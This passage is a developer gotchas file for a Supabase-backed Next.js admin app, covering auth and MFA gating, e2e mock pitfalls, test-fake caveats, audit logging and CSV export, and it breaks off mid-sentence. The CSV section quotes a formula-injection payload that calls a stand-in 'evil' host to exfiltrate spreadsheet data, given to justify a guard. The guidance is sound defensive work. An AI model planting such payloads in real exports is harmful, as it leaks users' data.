# stablepass-admin — Gotchas

## Every route starts with the admin gate
```ts
const g = await requireAdmin(); if ("res" in g) return g.res; const { sb } = g;
```
`sb` is the caller's RLS client; because they're admin, RLS `*_all_admin` policies apply. Never use a service-role client here.

## Same BFF primitives as stablepass-web
`lib/supabase/server.ts`, `lib/api/envelope.ts` are copied from web — keep them in sync. Envelope + status codes are the contract (403 = non-admin here).

## Race entry is two paths onto one runner
Race-first (`POST /races` → `POST /races/:id/runners`) and horse-first (`POST /horses/:id/races`, find-or-create the event) both end at a `race_horse` row. Results are per-runner (`POST /race-horses/:id/result`), which fans out `race_result` via the be push-dispatch function.

## Media uploads
Video → Mux, image/voice → Storage — the actual upload/watermark is orchestrated by the be side / Storage SDK; the admin route records the resulting ids/urls.

## Tests are the pass/fail
Each route ticket needs a test asserting the 403-for-non-admin branch + the happy-path status/envelope.

## ~~Mockups path drifts from .rx/mockups.md~~ — BOTH paths in this file were wrong (fixed 17 Aug 2026)
**This entry used to name `../dev-handover/StablePass-mockups/mockups/web/admin/screens/`. There is no
`dev-handover/` anywhere in the workspace and there never was** — so did the entry further down this
file, and so did `.rx/mockups.md` itself. All three were guesses that got copied forward. The real
root, verified by the round 5 grill and now correct in `.rx/mockups.md`:

```sh
ls "$(git rev-parse --git-common-dir)/../../../06-stage1-design/mockups/web/admin/screens/"
```

i.e. `06-stage1-design/mockups/web/admin/screens/` for the 10 admin screens, with the shared design
system at `06-stage1-design/mockups/web/style.css`. The `git-common-dir` form is the one to use: in a
`git worktree`, `..` is `.claude/worktrees/`, so a plain relative path resolves somewhere else.
Pull real token values (`--brand-green:#285D50`, `--cream:#FAF7F2`, `--muted:#6B6963`,
`--line:#E2DED6`, Inter/Cormorant) from `style.css` rather than eyeballing.
**Run the `ls` before "correcting" any mockup path in this repo, and paste the output when you do.**

## ~~The admin sign-in mockup is stale on 2FA~~ — REVERSED by ENG-370: the MOCKUP was right
**This entry used to say "build email+password only, 2FA is out of scope in v1". That is now wrong —
2FA shipped.** `screens/01-signin.html`'s "Authenticator code" field and its
"Protected by 2FA · Staff sessions audited" legal line are both real requirements. Do **not** delete
the code step or revert the legal line to match an older doc.

What actually shipped (ENG-370), because the mockup's *single form* still isn't buildable:
- **Two steps, two screens.** `/signin` = email + password (button: **Continue**); `/signin/mfa` =
  the 6-digit code. Supabase must mint the AAL1 session from the password **before** a TOTP code can
  be verified, so one submit would mean holding the password server-side.
- `/signin/mfa` reuses `.admin-signin` / `.admin-signin-card` and the mockup's own code-field styling
  verbatim. `app/globals.css` needed **no** new classes.
- `"/"` is reachable only at **aal2**. `requireAdmin()` 403s (`mfa_required`) an AAL1 admin;
  `requireAdminPage()` redirects to `/signin/mfa` (or `/signin/mfa-setup` when nothing is enrolled).

## First FE ticket bootstraps the toolchain (done in ENG-173)
The scaffold ships **no test runner and no design system**. ENG-173 added: vitest (`npm test` =
`vitest run`), the shared design tokens installed into `app/globals.css` with fonts wired via
`next/font` (Inter + Cormorant → `--font-inter`/`--font-cormorant`), and a Playwright screenshot
harness under `e2e/` that stands up a **mock Supabase HTTP server** (`e2e/mock-supabase.mjs`) so the
gated flow renders without a live backend (`npm run e2e`). `e2e/**` + `playwright.config.ts` are in
`tsconfig` `exclude` so the app gate never depends on Playwright types.

## The gated dashboard is the `(dash)` index → `/`, so delete the scaffold home
`app/(dash)/page.tsx` resolves to `/`. The create-next-app `app/page.tsx` also resolves to `/` — two
pages on one route is a build error, so the scaffold `app/page.tsx` + `page.module.css` must be removed
when the `(dash)` group lands.

## Page gate vs API gate — two functions in lib/auth/admin.ts
`requireAdmin()` returns a 401/403 **Response** (for `app/api/admin/*` route handlers).
`requireAdminPage()` **redirects** (`/signin`, or `/signin?error=forbidden` for a non-admin) because a
Server Component / layout can't return a Response. Both read `app_user.is_admin` via `getUser()` (not
`getSession()`) and fail closed (`!data?.is_admin`, so a missing row is denied).

## `(dash)` layout gate does NOT gate a page's own data fetch
The `(dash)` shell gate in `layout.tsx` is airtight for a static page, but Next renders layout + page
**in parallel** and caches the layout across soft navigations — it won't re-run per page. Any
data-bearing `(dash)` page (ENG-174 dashboard, resource screens) must re-assert `requireAdminPage()` /
gate its own reads (or rely on RLS `*_all_admin`), not lean on the layout alone.

## Admin API routes ship as T1 scaffold stubs — flesh them out in place
Routes like `app/api/admin/posts/**` already exist in the base branch as stubs with a
`// TODO(ticket):` marker and a placeholder body (`return ok({ id, action })`). An endpoint ticket
(e.g. ENG-175/T5) edits those files in place, not greenfield — read the stub first and keep the
`requireAdmin` preamble.

## `api-contract.md` POST /posts row is stale (multipart + asset ids)
The doc lists `POST /api/admin/posts` as `multipart` in with `muxAssetId/muxPlaybackId/mediaUrl` in the
response. The guardrail-correct **direct-upload** flow (bytes never transit our server) is **JSON in →
202 with an upload target out**: video `{ uploadUrl, muxUploadId }`, photo
`{ uploadUrl, path, token, bucket }`. Mux asset/playback ids don't exist until *after* the client's
direct upload (a webhook, later). T6 Compose must send JSON then PUT the bytes to the returned target.
A `502 storage_unavailable` code (photo path) was added alongside the doc's `mux_unavailable`.

## push-dispatch is invoked with the admin session, not a service-role secret
Publish/result fan-out calls `sb.functions.invoke("push-dispatch", …)` on the caller's RLS client — the
edge function holds service role internally (T2). The admin BFF never imports a service-role key. Keep
the fan-out best-effort (wrap in try/catch) so a notify failure never rolls back the status transition.

## No Mux SDK dependency — use the REST API
`lib/mux.ts` creates a direct upload via `fetch` to `https://api.mux.com/video/v1/uploads` with a
Basic-auth header from `MUX_TOKEN_ID`/`MUX_TOKEN_SECRET`; `playback_policy: ["signed"]`. Don't add
`@mux/mux-node` — it isn't in package.json and isn't needed for upload-URL creation.

## Route unit tests: mock `@/lib/supabase/server`, not the gate
`requireAdmin()` calls `supabaseServer()`, so `vi.mock("@/lib/supabase/server")` drives both the gate
(`app_user.is_admin`) and the route's own reads/writes from one fake. `lib/testing/supabase-fake.ts` is
a reusable scriptable client (per-table `select` vs `mutate` results, `functions.invoke`,
`storage.createSignedUploadUrl`) — reuse it for the other admin route tickets.

## ~~Mockups live OUTSIDE the repo — real path differs from `.rx/mockups.md`~~ — SUPERSEDED
Second copy of the same wrong guess; see the corrected entry near the top of this file. The mockups
**do** live outside the repo, but at `06-stage1-design/mockups/web/admin/screens/`, not under any
`dev-handover/` directory. Build live from the HTML + `style.css`, not from memory.

## A resource LIST screen needs no GET endpoint — Server Component reads via `supabaseServer()`
The admin list pages are Server Components under `app/(dash)/<res>/page.tsx` that query the RLS admin
client directly (gated by the layout). So a list ticket's surface may legitimately declare only the
mutation routes (e.g. ENG-179 trainers owns `POST/PATCH`, no `GET`). Keep data-fetching in a small
injectable helper (`app/(dash)/<res>/data.ts` taking `sb`) so it's unit-testable against the fake, and
use flat per-table queries + JS merge for derived columns (horse count, last-post, contact email) —
PostgREST embedding can't be verified here (no live backend), flat selects can.

## Screenshot a data-backed `(dash)` screen: extend the mock-Supabase harness
`e2e/mock-supabase.mjs` (from ENG-173) serves GoTrue + `app_user`. To screenshot a list/detail screen,
add PostgREST reads for its tables + a `POST /__control {empty}` toggle so one spec captures both the
populated and empty states (see ENG-179's trainer/horse/post/trainer_contact seed). The spec signs in
via the form, flips `/__control`, `goto`s the route, waits on a `data-testid`, and screenshots
`fullPage`. No live backend needed. Reuse this for horses (T8) and any future resource screen.

## e2e mock must honour `id=eq.` for `.maybeSingle()` single-row reads
This repo's `@supabase/postgrest-js` `.maybeSingle()` does NOT set the `pgrst.object` Accept header — it fetches as a
**list** and enforces cardinality client-side (errors → `data=null` if >1 row comes back). So a mock
(`e2e/mock-supabase.mjs`) that returns the whole fixture array for every `/rest/v1/<table>` GET makes a
`.eq("id",id).maybeSingle()` page read (e.g. the horse edit page) see N rows, null out, and hit `notFound()`. Do-this:
in the mock, branch on `url.search.includes("id=eq.")` and return the single matching fixture (object for `pgrst.object`,
singleton array otherwise). A PK-filtered `.maybeSingle()`/`.single()` is fine against a real DB (0/1 row) — this only bites the mock.

## Admin resource-screen component classes aren't in globals.css yet
ENG-173 ported only tokens + shell + buttons/inputs into `app/globals.css`. The resource-screen classes the mockups use
(`.adm-card`, `.chip`, `.pill`, `.horse-grid-adm`/`.horse-card-adm`, `.upload-zone`, `.btn-light`, `.adm-filter-bar`,
`.search-mini`) live only in the shared mockups `style.css`. Since `app/globals.css` is usually NOT in a screen ticket's
surface, ENG-178 (horses) scoped them into `app/(dash)/horses/horses.css` (imported by its pages) with values ported
verbatim from `style.css`. The next resource screen (trainers) will re-need a few — either promote the shared ones to
`globals.css` via a `shared-surface` ticket, or keep scoping per screen (duplicate CSS is harmless).

## `horse.status` (active/disabled) = visibility; `horse.training_status` = the phase
The add/edit "Visibility" select maps to `horse_status` (`active`=Visible, `disabled`=Hidden); the "Current status"
select maps to `training_status` (spelling…racing…retired). The list filter chips are training-status based: **Active =
`training_status != 'retired'`**, Racing = `'racing'`, Retired = `'retired'` (Active+Retired partition All; Racing ⊂
Active). `trainer_id` is **fixed for life of row** (schema note) — the edit route's allowlist omits it and the edit form
disables the trainer dropdown.
## Horse/trainer LISTS have no BFF endpoint — read them server-side ([PG])
`app/api/admin/horses/route.ts` + `trainers/route.ts` are **POST-create only**; there is no GET list.
Per `screen-api-map.md`, listing is Layer A `[PG] GET horse`/`trainer`. Elevated admin reads need the
session, which lives in **httpOnly cookies** — so the **browser** client (`supabaseBrowser`, anon) can't
do them. Read horse/trainer **server-side** in the page via `requireAdminPage()`'s `sb` and pass as
props (T6 Compose does this). The browser client is only good for token-authorized ops (Storage
`uploadToSignedUrl`), not RLS-gated table reads. Field mapping: horse name = `racing_name ?? display_name`;
byline default = `horse.trainer_id`; embed the trainer with `trainer:trainer_id(id,name,display_name)`.

## Post shape: it's `type` + `body`, not `media_kind` + `caption`
`post.type in ('video','photo','text','voice','news')` (compose creates video/photo only); the caption
is `post.body`; the byline is `post.source_trainer_id`. Create (`POST /api/admin/posts`) accepts
`{horseId,type,sourceTrainerId,title?}` and does **not** take the caption — set `body` afterwards via
`PATCH /api/admin/posts/:id {body, sourceTrainerId}`.

## FE screens need a CSS module — globals.css only carries the shell subset
`app/globals.css` has tokens + buttons + `admin-shell`/`admin-nav`/`admin-topbar` only. The compose /
form / member-post classes (`compose-grid`, `upload-zone`, `adm-input`, `.pill`, `.btn-light`,
`post-web`…) are **absent**. Don't edit globals.css from a screen ticket (collides with sibling screens);
port the needed rules into a scoped `*.module.css` inside the screen's own surface, referencing the
global `:root` tokens. Combine a global base class with a module modifier in JSX
(`className={`btn ${styles.btnLight}`}`).

## Component tests: repo ships no jsdom/testing-library — add per test
`vitest.config.ts` is `environment: "node"`. For a `renders`-style component test add devDeps
`@testing-library/react` + `jsdom` and put `// @vitest-environment jsdom` at the top of the `.test.tsx`.
Extract the network layer into a sibling `api.ts` and `vi.mock("./api")` so the component test never
touches fetch/Supabase/Mux. `URL.createObjectURL` is absent in jsdom — guard it in the component
(`typeof URL.createObjectURL === "function"`), don't assume it.

## Screenshots: `next start`, not `next dev`; mock server-reads, route browser-calls
Dev-mode Turbopack compile + Chromium can OOM a 16 GB box mid-run. Build once (`npm run build`) then
screenshot against `next start -p 3002` — far lighter. For a screen with server-side `[PG]` reads,
extend `e2e/mock-supabase.mjs` (the Next server hits :8787, so Playwright `page.route` can't intercept
those); for browser-side BFF/Storage calls (create-draft, signed-upload PUT), use `page.route` in the
spec so you don't touch the shared mock. Both are additive/collision-safe.

## `e2e/mock-supabase.mjs` now has a GENERIC DB handler that shadows post/horse (ENG-179)
Trainers (ENG-179) replaced the per-table mock fixtures with an in-memory `DB` + a catch-all
`if (GET && startsWith('/rest/v1/') && hasOwnProperty(DB, table)) return DB[table]`. `DB` holds
`trainer/horse/post/trainer_contact`, so that one handler now **shadows `/rest/v1/post` and
`/rest/v1/horse` for every screen** — a later screen's server reads of those tables silently get
trainer-shaped rows (no `horse_id`/`title`/`status`). Fix: put the new screen's `/rest/v1/post` +
`/rest/v1/horse` handlers **before** the generic one and disambiguate by the screen's own query
filters — the dashboard (ENG-174) keys on `status=eq.published` (post) and `status=eq.active` (horse);
trainers' reads carry neither, so they fall through untouched. Be HEAD-aware for `head:true` count
queries: emit a `Content-Range: 0-N/TOTAL` header (see `sendTable`) or `count` comes back null and the
tiles render 0. This file is a cross-ticket hotspot — expect to reconcile it on every screen rebase.
## mock-supabase.mjs now has a GENERIC `/rest/v1/<table>` dispatcher — it shadows resource handlers
T9 (trainers) added a `startsWith("/rest/v1/")` handler backed by a `DB` object (`{trainer,horse,post,
trainer_contact}`) built from a trainer seed, flipped populated↔empty via `POST /__control {empty}`. It
runs **before** the older per-resource handlers, so it silently serves ALL `/rest/v1/<table>` GETs whose
table is a `DB` key — including `post` (as trainer "last-activity" stubs: `{source_trainer_id,
published_at,created_at}`, **no `status`**). A new resource screen that adds its own `/rest/v1/<table>`
handler AFTER the dispatcher never runs and gets those stubs instead (symptom: SSR `Cannot read
properties of undefined (reading 'label')` because rows lack the fields you map). Fix: place your
handler **before** the generic dispatcher and **guard it** on a query-string discriminator unique to
your screen's read (posts library selects `status`; the trainers post read selects only
`source_trainer_id,published_at,created_at`) so you don't hijack the other screen's same-path read. Set
`Content-Range: start-end/total` for `count=exact` list reads (postgrest-js reads the total from it).

## The integration base can advance WHILE you build — rebase before you PR
`feature/admin-dashboard-v1` is shared; a sibling ticket (e.g. T9) can merge mid-build, moving the tip
past your branch point. `git worktree` shares refs, so a sibling's `git fetch` updates your
`origin/<base>` too. Before opening the PR: `git fetch && git rebase origin/feature/admin-dashboard-v1`,
then re-run the FULL gate (a shared file like `e2e/mock-supabase.mjs` can merge cleanly by text yet
collide at runtime — see the dispatcher gotcha above).

## Client-effect UI (`LocalTime`) renders EMPTY under `next dev` in Playwright — another reason to `next start`
Reinforces the "screenshots: `next start`, not `next dev`" note above, with a distinct symptom. A
component that fills its content in a post-mount `useEffect` (the `LocalTime` SSR-safe pattern from
ENG-251: empty `<time>` server-side, label filled after hydration) shows **permanently blank** when
Playwright drives `npm run dev` — the element keeps its `datetime`/attrs but `textContent` stays `""`
the whole run, and the only console noise is `ws://…/_next/webpack-hmr … WebSocket handshake:
net::ERR_INVALID_HTTP_RESPONSE`. Cause: in the e2e sandbox the dev HMR WebSocket handshake fails, Fast
Refresh never finishes initialising the client runtime, so effects never fire. It is a **dev-only
artifact** — against `next build && next start` hydration completes and labels fill correctly. Don't
mistake the blank labels for a real bug; verify against the prod build. Point Playwright's
`webServer.command` at `npm run build && npm run start -- -p <port>` (raise `timeout` to ~240s). Port
note: the shared checkout often already holds 3002 with the human's dev server (serving `main`, not your
branch) — screenshot YOUR branch via a temp, untracked `pw.*.config.ts` on a free port.

## `lib/testing/supabase-fake.ts` had no `.rpc()` — any RPC-backed route ticket must add it (ENG-275)
The fake only modelled `from()/auth/functions/storage`, so the first ticket to call `sb.rpc(...)` (ENG-275
analytics) couldn't unit-test at all. Extended additively: `FakeState.rpcs: Record<string,{data?,error?}>`,
`calls.rpc: {name,args}[]`, and an `rpc()` method on `makeFakeClient`. **Caveat:** an *unregistered* rpc name
returns `{data: [], error: null}`, so a test asserting only "we passed `p_since: null`" would still pass with a
WRONG function or argument name — it only proves what the client sent. Pin the mapping with a `toEqual` on the
full response shape, and smoke-test RPC names against a real DB before merge.

## Route tickets consuming another repo's RPCs: read the MERGED migration, don't infer
ENG-275's contract depended on 9 RPCs from ENG-273 in `stablepass-be`. The local `stablepass-be` checkout's
`supabase/migrations/` does NOT show them (they were on `feature/analytics-v1`, not main). Do-this:
`git -C ../stablepass-be fetch origin && git show origin/feature/<epic>:supabase/migrations/<file>.sql` and read
the `returns table (...)` blocks for the exact column names. Reviewers flagged the RPC layer "UNVERIFIED" because
they only see this repo — pre-empt it by quoting the migration evidence in the PR.

## `count`-style analytics fields need a real per-row scope or they're a global constant
ENG-275 first computed a post's `reach` as "all `trial|active` subscriptions" — identical for every post, making
`opens/reach` meaningless. The right source is the admin-readable `follow` table
(`follow(user_id, trainer_id, horse_id)`, `follow_no_duplicate unique(user_id,trainer_id,horse_id)` so a count is
already distinct-by-user, policy `follow_select_admin`): `reach = count(follow where horse_id = post.horse_id)`.
Check for a `follow`/join table before falling back to a global count.

## Table reads that ignore `error` turn an RLS regression into "no data"
`const rows = res.data ?? []` on an admin read renders a permission denial as a legitimately-empty list, and
`if (!data) return null` turns a failed query into a 404. Both hide a broken policy. Use an
`unwrap(res, what)` that throws on `res.error` for EVERY table read, and keep the genuine not-found branch after
it. Then catch at the route and return `fail("query_failed", "<generic>", 500)` — never `e.message`, which would
leak Postgres schema/SQL text to the client.

## Any CSV export of member-supplied text needs a formula-injection guard
RFC4180 quoting is NOT a mitigation: Excel/Sheets strip the quotes then evaluate a leading `=`, `+`, `-`, `@`,
tab or CR. A member-supplied `name` of `=HYPERLINK("http://evil"&A1,"x")` exfiltrates the export on one click.
Prefix any such cell with an apostrophe *before* applying the quoting rules (see `lib/analytics/csv.ts`).

## Mutation-test the analytics mappers — `toMatchObject` and fixture-shaped tests hide real gaps
On ENG-275 three behaviours survived mutation with a green suite: all `Number()` coercion deleted, the
array-shaped PostgREST embed branch stubbed to `null`, and `daysLeft` hardcoded to `-999`. Causes: fixtures used
JS numbers (never exercising the string-bigint path PostgREST can return), the array-embed fixture asserted only
the CSV header row, and `daysLeft` was never asserted. Use `toEqual` (not `toMatchObject`) on any PII payload so
a new leaked field fails, and assert derived fields explicitly including the edge case (an expired trial must be
`0`, not negative).

## e2e ran `next dev` despite the gotcha above — client screens were INERT (ENG-285)
`playwright.config.ts` had drifted to `command: "npm run dev -- -p 3002"` while the "Screenshots:
`next start`, not `next dev`" gotcha above said otherwise. Under the dev server the client bundle
never finished hydrating: every `"use client"` screen rendered its SSR markup but stayed dead — no
console error, no failed request, so it looks like a data bug. Symptom: compose's horse picker never
opened; the tell is that the caption counter stays at `0/240` while you type. Do-this: keep the
webServer on `npm run build && npm run start -- -p 3002` (timeout 300000). To decide "not hydrated"
vs "no data" in 30s, type into a control with a React-driven counter and watch whether it moves.

## Discriminate mock handlers on the query string EXACTLY — and beware a second shadowing pair
Extending the dispatcher gotcha above with what ENG-285 actually hit:
* **Two handlers can both claim one read.** Compose's horse read filters `status=eq.active`, the same
  discriminator the dashboard handler used — so the dashboard branch swallowed it and returned rows
  with no embedded `trainer`. When you add a branch, check no EARLIER branch already matches its
  query. All `/rest/v1/horse` branches now live in one ordered block for that reason.
* **Match the table name exactly, not by prefix.** `startsWith("/rest/v1/horse")` also catches a
  future `horse_*` table (`startsWith("/rest/v1/race")` already mis-captures `race_horse`, and
  `/rest/v1/trainer` catches `trainer_contact`). Use `url.pathname === "/rest/v1/<table>"`.
* **A catch-all fallback hides broken branches.** A fallback serving the good fixtures keeps the suite
  green even when the branch above it is broken — a mutation test proved it absorbed the break
  silently. Keep the fallback (it stops stub rows leaking) but make it `console.warn` loudly.

## A visibility-only e2e assertion proves nothing about content
`expect(page.locator(".horse-card-adm").first()).toBeVisible()` passed against 24 EMPTY cards for two
epics. Assert content (a fixture name, the trainer, the expected row count), not just presence — and
verify the assertion by mutation: break the mock deliberately, confirm the suite goes red, restore.
## mock-supabase discriminators: ANCHOR the filter and DECODE the search (ENG-276)
Two ways a new `/rest/v1/<table>` handler silently hijacks another screen, both hit on ENG-276:
1. **Unanchored filter.** `url.search.includes("id=eq.")` is ALSO true for `horse_id=eq.` — so a
   by-PK handler steals the posts library's horse-filtered list read (and its chip-count query), which
   then renders empty with all-zero counts. Use `/[?&]id=eq\./` and extract with the same anchored
   pattern, or the regex pulls the *horse* id out of `horse_id=eq.<uuid>`.
2. **`url.search` is PERCENT-ENCODED.** A PostgREST embed alias arrives as `trainer%3Asource_trainer_id`,
   so a raw `includes("trainer:source_trainer_id")` never fires and the handler is dead code — the read
   falls through to the generic dispatcher and returns wrong-shaped rows. `decodeURIComponent(url.search)`
   before any select-signature test.
Also: an embed alias is rarely unique. `trainer:source_trainer_id` is used by the posts library, the
posts API route, the preview route and dashboard queries; only the full `(name,display_name)` arg list
is analytics-only. Grep every caller before keying on a select fragment.

## Charts: hand-rolled inline SVG, no library — geometry belongs in a pure module
ENG-276 built the analytics charts as inline SVG matching the mockups' 420x150 viewBox (grid at
y=20/70/120, bars up from y=120, axis labels at y=136). Keep the maths in a pure `chart.ts`
(`barLayout`/`lineLayout`/`axisTicks`) so it unit-tests without a DOM, and guard the two cases real
data hits immediately: `max === 0` (a new platform) would make every ratio NaN, and an exact-zero bar
should render height 0 — a hairline stub reads as real data. Axis labels must be SHORT: 12 labels on a
420-unit viewBox clip at the edges, so put the long form in a `<title>` tooltip instead.

## The analytics BFF has no prior-period query
`getOpens/getEngagement/getClicks` take a single `since`; `getTrials()` takes none at all. So the
mockup's "+18% vs prior 30 days" tile deltas are NOT computable, and Subscribers/On-trial are
point-in-time counts that do not move with the period toggle. Don't fabricate a delta to match the
mockup — label honestly ("as of today") and raise a follow-up for a prior-period query.

## `page.screenshot({path})` OVERWRITES its baseline — e2e asserts nothing visual
The specs under `e2e/` capture *to* the committed PNG, so the suite passes regardless of visual
regression and `npm run e2e` always leaves a dirty tree. Two consequences:
1. **Never blanket-commit regenerated PNGs** — a blanket refresh is what got PR #18 rejected first
   time round. Justify any baseline you do commit, individually.
2. **A visual fix needs a non-visual guard.** The `gap={26}` trials-bar fix (AnalyticsScreen.tsx)
   had none: `barLayout(series, gap = 5)` takes gap as a DEFAULTED param, so a `chart.ts` unit test
   passes on the broken code — the defect was that no CALLER passed one. Only the rendered `rect`
   width proves it. See the "bar geometry" block in `AnalyticsScreen.test.tsx`; mutation-verify any
   replacement (drop `gap={26}` → must fail `expected 65 to be 44`).
   Assert the *expression* (`420 / 14 - 5`), not a literal, for charts that ride the default — the
   mockup draws 24 where we render 25, so a literal pins a known off-spec value and cries wolf.

## Which e2e baselines churn on every run (do NOT read these as regressions)
- `02-dashboard.png`, `02-dashboard-shell.png`, `10-post-analytics.png` — fixtures in
  `e2e/mock-supabase.mjs` are `Date.now()`-relative (+2h/+4h/+6h), so these differ on every capture.
- `05-horses-list.png` — churns too, and is easy to mistake for a real diff because it is ~5x larger
  (~3.2k px). It is a 1px vertical text-baseline jitter confined to the single "Winx" card
  (bbox x 520-741, y 473-764); content, data and layout are identical. Renderer nondeterminism.
- `07-compose-landscape.png` — churns by ~998 px (0.047% of ~2.1M) on a re-capture: antialiasing /
  decode noise on the recorded webm frame, not behaviour. Revert it unless the landscape path is
  what you actually changed (ENG-747).
Quantify before judging: `magick compare -metric AE old.png new.png /tmp/d.png`, then crop the bbox
and look. Don't eyeball full-page shots.

## ~~`06-compose-preview.png` is committed in an UNPAINTED state~~ — FIXED in ENG-558
Was: the preview modal got screenshotted before its blob-URL media decoded, so the baseline showed the
empty media ground instead of the file. `e2e/compose.spec.ts` now has a `settle(page, where)` helper —
wait for the media element to report real intrinsic size, then a double `requestAnimationFrame` (one
frame to lay out at the new aspect, one to paint it) — and every compose shot goes through it.

**The trap inside the fix: SCOPE the wait to the pane you are shooting.** The modal duplicates every
preview `data-testid`, and the rail's copy comes first in DOM order and is already decoded, so an
unscoped `document.querySelector('[data-testid="preview-media"]')` resolves against the rail and
returns instantly — silently reintroducing the exact "shot before it painted" flake, but only for the
modal. `settle()` takes `"rail" | "modal"` and prefixes `[data-testid="preview-panel"] ` for the
latter. Any new spec that screenshots a duplicated component needs the same treatment.

## Gate tickets: check the integration branch's own ancestry before PR-ing to main
`stablepass-be`'s `feature/analytics-v1` turned out to be `feature/member-api-v1` + ONE commit, and
member-api-v1's gate PR was still open — so an analytics-v1 → main PR silently carries the whole of
the other epic (5.4k lines). Run `git merge-base --is-ancestor origin/feature/<other> HEAD` and
`git log --oneline origin/main..HEAD` before opening a gate PR, and put the merge-order call at the
TOP of the body. `git diff --stat` alone will badly mislead you about what a gate PR contains.

## `getAuthenticatorAssuranceLevel()` decodes the access token as a REAL JWT
auth-js's no-argument path calls `decodeJWT(session.access_token)`, which throws
`AuthInvalidJwtError` unless the token is exactly 3 base64url parts. `e2e/mock-supabase.mjs`'s old
`FAKE_ACCESS_TOKEN = "fake-access-token"` therefore made every aal read blow up. The mock now mints a
structurally valid unsigned JWT carrying an `aal` claim (`jwt("aal1")` / `jwt("aal2")`, signature
segment is the literal `"sig"` — the client never verifies it) and flips `currentAal` on a successful
verify. Related: `mfa.listFactors()` does **not** call a factors endpoint — it reads `user.factors`
off `GET /auth/v1/user`, and only `status:"verified"` entries land in the `totp` bucket.

## The admin audit trail has TWO RPCs and the wrong one fails SILENTLY
stablepass-be (ENG-369) ships `log_admin_signin_fail(p_email,p_ip,p_user_agent)` — anon-callable, event
hard-coded — and `log_admin_auth_event(p_event,…)` — authenticated/service_role only, **with an in-body
guard**. Call the general one without a session and it inserts **zero rows and still returns 204**. So:
- a **failed password** must use `log_admin_signin_fail` (no session exists at that moment);
- `mfa_fail` (and the valid-password-non-admin `signin_fail`) must be logged **BEFORE** `signOut()`.
Pin the ordering with an ordered trace array (`expect(trace).toEqual(["rpc:mfa_fail","signOut"])`), not
`toHaveBeenCalled` — a `toContain` assertion passes with the lines swapped.

## `p_ip` is `inet`: a PARTIAL IPv6 raises 22P02 from the ARGUMENT CAST
The cast runs *before* the function's never-raise body, so a bad value silently loses the audit row.
`X-Forwarded-For` is routinely a list (`client, proxy1, proxy2`) — never forward it raw. The subtle
trap is partial IPv6: `1:2`, `:`, `:::`, `abcd:`, `0:0`, `1:2:3` all *look* like addresses and are all
rejected by Postgres. Validating only the group **count** (`<= 8`) is not enough — require exactly 8
groups unless a single `::` is present, reject stray leading/trailing colons, and accept an IPv4 tail
(`::ffff:192.0.2.1` is the routine dual-stack form). Since XFF is client-supplied, a loose parser lets
an attacker suppress their own `signin_fail` rows with one header. See `lib/audit.ts#parseIp`.

## postgrest-js RESOLVES with `{error}` — a bare try/catch around `.rpc()` is dead code
`await sb.rpc(...)` does not reject on a PostgREST error (only `.throwOnError()` does), so wrapping an
audit/fire-and-forget RPC in `try/catch` catches nothing that actually happens: a 22P02 bad cast, a
renamed function (PGRST202), a revoked grant and a real success all look identical. Inspect `error` and
`console.warn` it; keep the never-rethrow contract. This is the write-side twin of the existing
"table reads that ignore `error` turn an RLS regression into 'no data'" note.

## Touching the admin gate breaks the SHARED test fake + every inline e2e sign-in
Two cross-cutting consequences to budget for when `lib/auth/admin.ts` gains a condition:
1. `lib/testing/supabase-fake.ts` backs ~30 `app/api/admin/**` route tests. A new `sb.auth.*` call the
   fake doesn't implement becomes a `TypeError`, the gate fails closed, and every route test 403s.
   Add the stub and default it to the PASSING value (`aal: "aal2"`) so existing tests keep their
   intent — then add ONE dedicated test that drives the failing branch through a real route handler
   against a POPULATED table (`lib/auth/admin-aal2-route.test.ts`), or the new branch is untested.
2. Six e2e specs (`analytics/compose/dashboard/horses/posts/trainers`) each carry their own inline
   `signIn()` helper. Changing the sign-in flow or the submit button's label breaks all six at once.

## `lib/audit.ts`'s `AdminAuthEvent` union omits `mfa_enrolled` (ENG-371)
The file's own header reserves it ("`mfa_enrolled` is A2's") and the RPC's check constraint accepts
it, but the exported union is only `signin_ok|signin_fail|mfa_ok|mfa_fail`. A2 could not edit
`lib/audit.ts` (A1's surface), so it bridges with `const MFA_ENROLLED = "mfa_enrolled" as
AdminAuthEvent` at the call site. Harmless — `logAdminAuthEvent` only forwards the string as
`p_event`, no switch/exhaustiveness — but **widen the union** when A1's file is next touched, and
don't "fix" the cast by writing a second audit wrapper.

## Don't gate `/signin/mfa-setup` with `requireAdminPage()` — it redirects TO that route
`requireAdminPage()` sends an AAL1 admin with `hasFactor === false` to `/signin/mfa-setup`, so using
it to gate that page is an infinite redirect. The enrolment page must do the checks inline (no
session → `/signin`; non-admin → `/signin?error=forbidden`; verified factor → `/` at aal2 or
`/signin/mfa` at aal1). The A1↔A2 pair is loop-free because both key off `factors.totp` with
opposite polarity, and A1's page only bounces back on a POSITIVE zero-factor read (`!error &&`).
Same shape applies to any future "you must do X before continuing" screen the gate redirects to.

## `lib/testing/supabase-fake.ts` defaults `aal` to `"aal2"` — and models no `auth.mfa.*`
ENG-370 added `aal: "aal1"|"aal2"` defaulting to **"aal2"** so pre-existing route tests kept passing.
Any test of an AAL1 path that forgets to set it exercises the wrong branch and passes for the wrong
reason — set it explicitly. The fake also has no `mfa.enroll/unenroll/listFactors/challengeAndVerify`
and no `signOut`, so MFA-flow tests hand-roll their own `vi.mock("@/lib/supabase/server")` (see
`app/signin/mfa/actions.test.ts` and `app/signin/mfa-setup/*.test.ts`).

## A query-builder mock that swallows its arguments cannot see an IDOR
`from: () => ({select: () => ({eq: () => ({single: ...})})})` makes `.eq("id", user.id)` and
`.eq("id", "anyone-else")` indistinguishable — a self-review mutation to a stranger's row left the
suite fully green. Record the filter (`state.reads.push(`${table}.${col}=${val}`)`) and assert it.
Keep it in a SEPARATE array from the side-effect trace so "no write happened" assertions
(`expect(trace).toEqual([])`) still mean what they say.

## Guard the PAYLOAD of a Supabase call, not just its `error`
`e2e/mock-supabase.mjs`'s catch-all answers **`200 {}`** for any unhandled route (not 404), so a
missing endpoint yields `{data: {}, error: null}` — a shape that passes an `if (error)` check and
then throws on the first property access. `mfa.enroll` guarded only on `error` would 500 the one
screen an admin cannot route around. Guard the field you're about to read
(`enrolled?.totp?.qr_code ? … : null`) and unit-test that third shape — `{data:null,error}` does NOT
cover it.

## `e2e/mock-supabase.mjs` has the CHALLENGE half of the MFA API but not the ENROL half
It serves `POST /auth/v1/factors/:id/{challenge,verify}` and its `ADMIN_USER` always carries a
*verified* factor, so no session it mints can reach a "nothing enrolled" state. There is no
`POST /auth/v1/factors` and no `DELETE /auth/v1/factors/:id`. ENG-371 therefore e2e-tests only the
